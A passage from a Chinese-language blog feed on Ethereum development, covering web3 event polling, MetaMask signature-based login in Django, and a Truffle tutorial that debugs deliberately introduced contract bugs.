class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def handle(self, *args, **options):</span><br><span class="line">    event_filter = w3.eth.filter(&#123;&quot;address&quot;: contract_address&#125;)</span><br><span class="line">    poll_interval = 2</span><br><span class="line">    while True:</span><br><span class="line">    for event in event_filter.get_new_entries():</span><br><span class="line">    handle_event(event)</span><br><span class="line">    time.sleep(poll_interval)</span><br></pre></td></tr></table></figure><p>event 可以给参数加 indexed 属性，这样这些参数值会存到日志结构的 topic 部分，有助于过滤和查找。</p><p>参考链接：</p><ol><li><a href="http://me.tryblockchain.org/blockchain-solidity-event.html" target="_blank" rel="noopener">http://me.tryblockchain.org/blockchain-solidity-event.html</a></li><li><a href="http://web3.tryblockchain.org/web3-js-in-action.html" target="_blank" rel="noopener">http://web3.tryblockchain.org/web3-js-in-action.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们从一个简单的例子开始：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pragma solidity ^0.4.0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;contract Calc&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  uint count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function add(uint a, uint b) returns(uint)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return a + b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function getCount() constant returns (uint)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面是 Solidity 智能合约，我们将合约编译发布后，会通过 web3.js 调用，如调用 getCount()&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>智能合约开发 - 如何实现一键化登录 Dapp</title>
    <link href="https://facert.github.io/2018/06/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%80%E9%94%AE%E5%8C%96%E7%99%BB%E5%BD%95-Dapp/"/>
    <id>https://facert.github.io/2018/06/17/智能合约开发-如何实现一键化登录-Dapp/</id>
    <published>2018-06-17T10:56:56.000Z</published>
    <updated>2018-06-18T14:26:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>任何有帐户体系的网站和 app 都会有自己的登录模块，有时候还会集成 oauth2 （weibo, weixin，github)一键化登录.开发者肯定也都或多或少的开发过注册，登录的功能。那么基于以太坊的 Dapp 中登录功能会有什么区别呢？本文主要介绍了 Dapp 帐号体系的构成，以及如何基于 Metamask 开发一键化登录的功能。</p><a id="more"></a><p>首先 Dapp 跟普通的网站(app)没多少区别，完全可以延续之前的帐号体系登录，注册。在需要用到以太坊区块链的时候（比如创建交易，支付等）调用钱包或者 MetaMask 插件即可。</p><p>当然本身以太坊就有自己的帐号，每个人都可以创建 Address 来和区块链交互，所以如果我们的 Dapp 跟 Address 能够绑定并实现登录的话，整体的体验会好很多。</p><p>解决方案是利用私钥对 payload 加密生成 signature，然后再用<br>ecdsa_recover 方法对 signature 解密可以拿到对应的公钥。</p><p><img src="/media/15292352605816.gif" alt=""></p><p>我们来看下具体的步骤 （默认已经安装 MetaMask）</p><p>（1）前端点击登录按钮，首先通过 <code>web3.eth.accounts[0]</code> 拿到 publicAddress，然后去后端拿 nonce </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpClient.post(&apos;/api/user&apos;, &#123;address&#125;)</span><br></pre></td></tr></table></figure><p>（2）后端拿到 address 后，会去数据库查询是否存在这个用户，如果有，则直接返回跟 address 对应的 nonce。没有的话，会执行一个注册用户的过程，同样返回 nonce。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Profile(models.Model):</span><br><span class="line">    user = models.OneToOneField(User, on_delete=models.CASCADE)</span><br><span class="line">    public_address = models.CharField(max_length=256)</span><br><span class="line">    nonce = models.IntegerField()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def user()</span><br><span class="line">    public_address = boby.get(&quot;address&quot;)</span><br><span class="line">    profiles = Profile.objects.filter(public_address=public_address.lower())</span><br><span class="line">    </span><br><span class="line">    if not profiles.exists():</span><br><span class="line">        user = User.objects.create(username=public_address.lower())</span><br><span class="line">        profile = Profile.objects.create(user=user, public_address=public_address.lower(), nonce=generate_nonce())</span><br><span class="line">    else:</span><br><span class="line">        profile = profiles[0]</span><br><span class="line">    return profile</span><br></pre></td></tr></table></figure><p>(3) 前端拿到 nonce 之后会去找 MetaMask 签名生成 signature</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.personal.sign(nonce, public_address, callback);</span><br></pre></td></tr></table></figure><p>(4) 最后拿 signature 和 address 到后端验证是否签名正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpClient.post(&apos;/api/login&apos;, &#123;address, signature&#125;);</span><br></pre></td></tr></table></figure><p>(5) 后端验证，验证成功则完成登录（基于 session 或 jwt）操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message_hash = defunct_hash_message(text=&quot;signature nonce:%s&quot; % profile.nonce)</span><br><span class="line">recover_address = w3.eth.account.recoverHash(message_hash, signature=signature)</span><br><span class="line">if recover_address and recover_address.lower() == public_address:</span><br><span class="line">    user_login(request, profile.user)</span><br></pre></td></tr></table></figure><p>这里面的 recoverHash 函数是 python web3.py 模块的。由于以太坊的椭圆曲线加密函数签名参数与比特币不太一样，所以如果用其他椭圆加解密包没法验证通过的话，可查看是不是参数设置不同。</p><p>(6) 登录成功后，前后端交互就跟普通 http 请求没什么区别了。</p><p><img src="/media/15292413044056.jpg" alt=""></p><p>借用一张图来说明登录流程 （challenge 跟上文的 nonce 一致）</p><p>最后，我们其实可以看到目前这个登录方式强依赖于 MetaMask 插件，对于手机端 App 是无效的，需要有专门的钱包 app 来完成签名等功能。不过可以展望下，如果 Dapp 越来越多，那么这些基础插件会越来越丰富和完善。</p><p>参考链接：</p><ol><li><a href="https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial" target="_blank" rel="noopener">https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial</a></li><li><a href="https://github.com/amaurymartiny/login-with-metamask-demo" target="_blank" rel="noopener">https://github.com/amaurymartiny/login-with-metamask-demo</a></li><li><a href="https://github.com/m0t0k1ch1/metamask-login-sample" target="_blank" rel="noopener">https://github.com/m0t0k1ch1/metamask-login-sample</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;任何有帐户体系的网站和 app 都会有自己的登录模块，有时候还会集成 oauth2 （weibo, weixin，github)一键化登录.开发者肯定也都或多或少的开发过注册，登录的功能。那么基于以太坊的 Dapp 中登录功能会有什么区别呢？本文主要介绍了 Dapp 帐号体系的构成，以及如何基于 Metamask 开发一键化登录的功能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>智能合约调试指南</title>
    <link href="https://facert.github.io/2018/04/06/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>https://facert.github.io/2018/04/06/智能合约调试指南/</id>
    <published>2018-04-06T06:52:26.000Z</published>
    <updated>2018-04-06T09:11:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>注意：本教程的 Truffle 版本 4.4.0 及以上</code></p><p>不像你在其他地方看到的纸质合约，以太坊的智能合约是代码组成的，需要你以非常谨慎的态度去对待它。</p><p>（这是一件好事，想象下如果现实世界的合同需要编译的话会更清晰么？）</p><p>如果我们的合同没有被正确的编码出来, 我们的交易可能会失败，导致以太币的损失(以 gas 的形式)，更不用说浪费时间和精力。</p><p><strong>幸运的是，Truffle (版本 4 以上) 内置了逐步调试的功能</strong>，所以一旦发生错误，你可以很快发现并修复它。</p><p>在本教程中,我们将在测试的区块链环境中部署一个基础的合同，并引入一些错误，通过 Truffle 内置调试器修复它们。<br><a id="more"></a></p><h4 id="一个基础的智能合约"><a href="#一个基础的智能合约" class="headerlink" title="一个基础的智能合约"></a>一个基础的智能合约</h4><p>一个最基础的合同是一个简单的存储类型的智能合约。（这个例子改编自 <a href="https://solidity.readthedocs.io/en/develop/introduction-to-smart-contracts.html" target="_blank" rel="noopener">Solidity documentation</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.17;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">  uint myVariable;</span><br><span class="line"></span><br><span class="line">  function set(uint x) public &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function get() constant public returns (uint) &#123;</span><br><span class="line">    return myVariable;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此合约做了两件事：</p><ul><li>允许你设置一个变量（myVariable）为特定整数值。</li><li>允许你查询一个选定的值。</li></ul><p>这不是一个非常有趣的合约，但是这不是重点。我们想看看出错后会发生什么当事情。</p><p>首先我们配置环境。</p><h4 id="部署智能合约"><a href="#部署智能合约" class="headerlink" title="部署智能合约"></a>部署智能合约</h4><ol><li><p>首先为我们的合约创建一个新的本地目录:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir simple-storage</span><br><span class="line">cd simple-storage</span><br></pre></td></tr></table></figure></li><li><p>创建一个空的 Truffle 项目</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle init</span><br></pre></td></tr></table></figure></li></ol><pre><code>这个命令将创建目录，比如 `contracts/` 和 `migrations/`,并生成一些文件用于帮助部署合约到区块链。</code></pre><ol><li><p><code>contracts/</code> 目录中有一个 <code>Store.sol</code> 文件。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.17;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">  uint myVariable;</span><br><span class="line"></span><br><span class="line">  function set(uint x) public &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function get() constant public returns (uint) &#123;</span><br><span class="line">    return myVariable;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这是我们需要调试的合约，详细的合约内容的解释超出了本教程的范围，注意我们有一个名为 `SimpleStorage` 的合约，里面有个数字类型的变量 `myVariable` 和两个函数 `set()` 和 `get()`。第一个函数设置变量内容，第二个获取变量。</code></pre><ol><li><p><code>migrations/</code> 目录下，有个 <code>2_deploy_contracts.js</code> 文件。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var SimpleStorage = artifacts.require(&quot;SimpleStorage&quot;);</span><br><span class="line"></span><br><span class="line">module.exports = function(deployer) &#123;</span><br><span class="line">  deployer.deploy(SimpleStorage);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这个文件是管理部署 `SimpleStorage` 合约的。</code></pre><ol><li><p>在终端中，编译此合约 </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle compile</span><br></pre></td></tr></table></figure></li><li><p>再开一个终端，运行 <code>truffle develop</code> ，开启 truffle 内置的测试区块链，这样我们可以使用它来测试合约。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle develop</span><br></pre></td></tr></table></figure><p> 这个命令将出现提示符 <code>truffle(develop)&gt;</code>， 从现在开始，所有的命令都在此提示符下输入（特殊情况会说明）</p></li><li><p>当开发控制台运行起来后，我们可以部署我们的合约了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate</span><br></pre></td></tr></table></figure></li></ol><ol><li>下面的相应有些类似，除了 id 不同。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Running migration: 1_initial_migration.js</span><br><span class="line">  Replacing Migrations...</span><br><span class="line">  ... 0xe4f911d95904c808a81f28de1e70a377968608348b627a66efa60077a900fb4c</span><br><span class="line">  Migrations: 0x3ed10fd31b3fbb2c262e6ab074dd3c684b8aa06b</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x429a40ee574664a48753a33ea0c103fc78c5ca7750961d567d518ff7a31eefda</span><br><span class="line">Saving artifacts...</span><br><span class="line">Running migration: 2_deploy_contracts.js</span><br><span class="line">  Replacing SimpleStorage...</span><br><span class="line">  ... 0x6783341ba67d5c0415daa647513771f14cb8a3103cc5c15dab61e86a7ab0cfd2</span><br><span class="line">  SimpleStorage: 0x377bbcae5327695b32a1784e0e13bedc8e078c9c</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x6e25158c01a403d33079db641cb4d46b6245fd2e9196093d9e5984e45d64a866</span><br><span class="line">Saving artifacts...</span><br></pre></td></tr></table></figure><h4 id="和基础的智能合约交互"><a href="#和基础的智能合约交互" class="headerlink" title="和基础的智能合约交互"></a>和基础的智能合约交互</h4><p>智能合约通过 <code>truffle develop</code> 部署到了测试网络中，运行 <a href="http://truffleframework.com/docs/getting_started/console" target="_blank" rel="noopener">console</a> 而不是 <a href="http://truffleframework.com/ganache/" target="_blank" rel="noopener">Ganache</a>，一个内置在 Truffle 的本地区块链。</p><ol><li><p>在 <code>truffle develop</code> 运行的终端中，输入如下命令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.get.call();&#125;).then(function(value)&#123;return value.toNumber()&#125;);</span><br></pre></td></tr></table></figure><p> 这个命令找到 SimpleStorage 合约，然后调用 <code>get()</code> 命令，通常返回一个字符串并转化为数字。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure></li></ol><pre><code>`myVariable` 被设置为 0，尽管我们还没给它赋值。这是因为 Solidity 数值型变量会自动被赋值为 0，不像其他语言会是 `NULL` 和 `undefined`。</code></pre><ol><li><p>现在我们运行一条交易命令，调用 <code>set()</code> 设置我们的变量为其他值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);</span><br></pre></td></tr></table></figure><p> 设置变量为 4，返回的信息包括交易（交易 id ，交易receipt 和一些交易的时间 log）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#123; tx: &apos;0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42&apos;,</span><br><span class="line">receipt:</span><br><span class="line"> &#123; transactionHash: &apos;0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42&apos;,</span><br><span class="line">   transactionIndex: 0,</span><br><span class="line">   blockHash: &apos;0x60adbf0523622dc1be52c627f37644ce0a343c8e7c8955b34c5a592da7d7c651&apos;,</span><br><span class="line">   blockNumber: 5,</span><br><span class="line">   gasUsed: 41577,</span><br><span class="line">   cumulativeGasUsed: 41577,</span><br><span class="line">   contractAddress: null,</span><br><span class="line">   logs: [] &#125;,</span><br><span class="line">logs: [] &#125;</span><br></pre></td></tr></table></figure></li></ol><pre><code>最重要的是交易的 id (在这里是 tx 和 transactionHash)。我们需要赋值这个值用来调试。</code></pre><ol><li><p>想验证值是否已经改变，运行 <code>get()</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.get.call();&#125;).then(function(value)&#123;return value.toNumber()&#125;);</span><br></pre></td></tr></table></figure></li><li><p>输出</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure></li></ol><h4 id="调试错误"><a href="#调试错误" class="headerlink" title="调试错误"></a>调试错误</h4><p>上文展示了智能合约如何工作，现在我们引入一些错误到合约中。</p><p>针对如下几个错误</p><ul><li>无限循环</li><li>无效错误检查</li><li>无错误，但是函数没有按预期执行</li></ul><h5 id="错误-1-无限循环"><a href="#错误-1-无限循环" class="headerlink" title="错误 #1: 无限循环"></a>错误 #1: 无限循环</h5><p>在以太坊区块链中，交易不能永远执行下去。</p><p>一个交易会一直执行到 gas 用尽。一旦发生这种情况，交易会返回 <code>out of gas</code> 错误。</p><p>因为 gas 是以以太币计费的，所以会造成真实的资产损失，所以修复这种错误迫在眉睫。</p><p><strong>引入错误</strong></p><ol><li>在编辑器打开 <code>contracts/</code> 目录中的 <code>Store.sol</code></li><li><p>替换 <code>set()</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function set(uint x) public &#123;</span><br><span class="line">  while(true) &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>因为 <code>while(true)</code> 所以函数永远不会退出。</p><p><strong>测试合约</strong></p><p>Truffle 的开发终端不重启就可以重新部署合约。我们可以通过 <code>migrate</code> 一步编译和部署合约</p><ol><li><p>Truffle 的开发终端中，更新合约</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate --reset</span><br></pre></td></tr></table></figure></li><li><p>为了更好的捕获错误，我们打开第二个终端</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle develop --log</span><br></pre></td></tr></table></figure><p> 然后回到之前的终端中</p></li><li><p>现在我们可以运行交易了，运行 <code>set()</code> 命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);</span><br></pre></td></tr></table></figure></li><li><p>捕获到错误</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: VM Exception while processing transaction: out of gas</span><br></pre></td></tr></table></figure></li></ol><pre><code>在 log 的终端中，我们可以看到更多信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    develop:testrpc eth_sendTransaction +0ms</span><br><span class="line">develop:testrpc  +1s</span><br><span class="line">develop:testrpc   Transaction: 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f +2ms</span><br><span class="line">develop:testrpc   Gas usage: 4712388 +11ms</span><br><span class="line">develop:testrpc   Block Number: 6 +15ms</span><br><span class="line">develop:testrpc   Runtime Error: out of gas +0ms</span><br><span class="line">develop:testrpc  +16ms</span><br></pre></td></tr></table></figure>通过这些信息，我们可以调试这个交易</code></pre><p><strong>调试错误</strong></p><p>调出 debug 的命令是在 Truffle 开发终端输入 <code>debug &lt;Transaction ID&gt;</code> 或者直接在终端中输入 <code>truffle debug &lt;Transaction ID&gt;</code>，现在让我们开始吧!</p><ol><li><p>在 Truffle 开发终端中，复制粘贴交易 id 到 debug 命令后</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f</span><br></pre></td></tr></table></figure><p> 你将看到如下输出</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> Gathering transaction data...</span><br><span class="line"></span><br><span class="line">Addresses affected:</span><br><span class="line">  0x377bbcae5327695b32a1784e0e13bedc8e078c9c - SimpleStorage</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">(enter) last command entered (step next)</span><br><span class="line">(o) step over, (i) step into, (u) step out, (n) step next</span><br><span class="line">(;) step instruction, (p) print instruction, (h) print this help, (q) quit</span><br><span class="line"></span><br><span class="line">Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</span><br><span class="line"></span><br><span class="line">1: pragma solidity ^0.4.17;</span><br><span class="line">2:</span><br><span class="line">3: contract SimpleStorage &#123;</span><br><span class="line">   ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line"></span><br><span class="line">debug(develop:0xe4933407...)&gt;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这是个交互式命令行，你可以用列出的命令和程序交互* 最常用的命令是 `step next`，命令执行一次往下一行代码，快捷键是 `Enter` 或者 `n` 输出        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:    4:   uint myVariable;    5:    6: function set(uint x) public {       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^注意程序已经移动到了下一个命令，第六行中。* 键入 `Enter`        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {        ^^^^^^^^^^^^* 不断按 `Enter`        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {               ^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {         ^^^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;                        ^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;           ^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;           ^^^^^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {         ^^^^^^^^^^^^</code></pre><p>请注意，最终步骤会一直重复。事实上，按回车会永远重复那些交易(直到用完 gas )。而这会告诉你问题在哪里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 错误 #2: 无效错误检查</span><br><span class="line"></span><br><span class="line">智能合约可以用 `assert()` 来保证必要特定条件会出现。这种和合约状态的冲突是不可调和的。</span><br><span class="line"></span><br><span class="line">**引入错误**</span><br><span class="line"></span><br><span class="line">现在我们来引入这个错误，看看调试器如何发现它。</span><br><span class="line"></span><br><span class="line">1. 再次打开 `Store.sol`</span><br><span class="line">2. 替换 `set()` 函数</span><br></pre></td></tr></table></figure></p><pre><code>function set(uint x) public {  assert(x == 0);  myVariable = x;}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    和前一个版本一样，只是多了 `assert()` 函数，保证 `x == 0`，如果我们设置 x 为其他值，我们就会发现错误。</span><br><span class="line">    </span><br><span class="line">**测试合约**</span><br><span class="line"></span><br><span class="line">和之前一样，我们重置下合约</span><br><span class="line"></span><br><span class="line">1. `migrate --reset`</span><br><span class="line">2. `SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    我们会看到如下错误</span><br></pre></td></tr></table></figure>Error: VM Exception while processing transaction: invalid opcode<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**调试错误**</span><br><span 